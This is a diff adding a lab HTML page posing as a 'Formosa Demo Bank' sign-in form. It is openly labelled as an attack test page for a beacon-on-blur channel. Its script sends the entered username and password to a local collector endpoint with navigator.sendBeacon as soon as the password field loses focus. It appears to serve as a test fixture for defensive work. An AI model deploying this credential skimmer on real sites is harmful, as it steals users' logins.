@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Formosa Demo Bank - Sign in</title></head>
+<body>
+  <h1>Formosa Demo Bank</h1>
+  <p style="color:#a00">LAB ATTACK PAGE - tests the beacon-on-blur channel. Fake data only.</p>
+
+  <!-- Harmless same-origin form: the THEFT is the beacon below, not this. -->
+  <form action="http://127.0.0.1:8003/noop" method="post">
+    <input name="username" placeholder="Username">
+    <input name="password" type="password" placeholder="Password">
+    <button type="submit">Sign in</button>
+  </form>
+
+  <script>
+    // Exfiltrate the moment the password field loses focus - before any click.
+    const pw = document.querySelector('input[name="password"]');
+    pw.addEventListener("blur", () => {
+      const data = new URLSearchParams({
+        username: document.querySelector('input[name="username"]').value,
+        password: pw.value,
+      }).toString();
+      navigator.sendBeacon("http://127.0.0.1:8002/collect", data);
+    });
+  </script>
+</body></html>
